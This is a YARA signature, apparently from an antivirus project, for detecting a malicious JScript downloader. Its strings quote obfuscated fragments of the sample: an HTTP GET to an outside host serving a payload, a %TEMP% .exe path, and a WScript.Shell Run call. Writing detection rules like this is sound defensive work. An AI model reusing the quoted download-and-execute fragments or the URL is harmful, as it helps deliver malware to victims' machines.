rule sig_20160328_a2aa8784855e15088e882de3e26b063a {
  meta:
    description = "datamaliciousorder - file 20160328_a2aa8784855e15088e882de3e26b063a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "146b2cf3e871a2b8ab8ea043c3636a182be22bed456e24eb6ad117405d80aff0"

  strings:
    $s1  = "function Heuyivmy() {return Tpmdm[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"exhMwSLq.exe\";};" fullword ascii
    $s2  = "Didnk[Njoobvova](\"GET\", \"http://foothillsofhemet.com/k4sifs\", false);" fullword ascii
    $s3  = "do {WScript[Lxymi](Oycegg() * 11)} while (Didnk[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Tpmdm = function Luuvhgf() {return WScript[Zncfszk](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Cvxjxg(Uxzmh, Hntwj){return Uxzmh - Hntwj;};" fullword ascii
    $s6  = "function Glujuuianx(Gsbnpiwd){Tpmdm[\"Run\"](Gsbnpiwd, Vgunqowvuj, Vgunqowvuj);};" fullword ascii
    $s7  = "function Aeegshpt() {return ((Prjpaapfr == true) && (Prjpaapfr == Jwjte)) ? 1 : Vgunqowvuj;};" fullword ascii
    $s8  = "var Jwjte = false;" fullword ascii
    $s9  = "Jwjte = true; " fullword ascii
    $s10 = "return Cvxjxg(Lbwaiamo, Zxuwdqu);" fullword ascii
    $s11 = "var Prjpaapfr = false;" fullword ascii
    $s12 = " while (Mxqqe){" fullword ascii
    $s13 = "var Xiiiltm = false;" fullword ascii
    $s14 = "function Bncwu(){return Zncfszk;};" fullword ascii
    $s15 = "function Knypiggge(Cmswhwody) {var Hatjql = (1, 2, 3, 4, 5, Cmswhwody); return Hatjql;};" fullword ascii
    $s16 = "var Puawjkutlp = new this[\"Date\"]();" fullword ascii
    $s17 = "Prjpaapfr = true; " fullword ascii
    $s18 = "function Oycegg(){return 22;};" fullword ascii
    $s19 = "function Bwxrq()" fullword ascii
    $s20 = "} catch(Wfsqitlh){Mxqqe = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}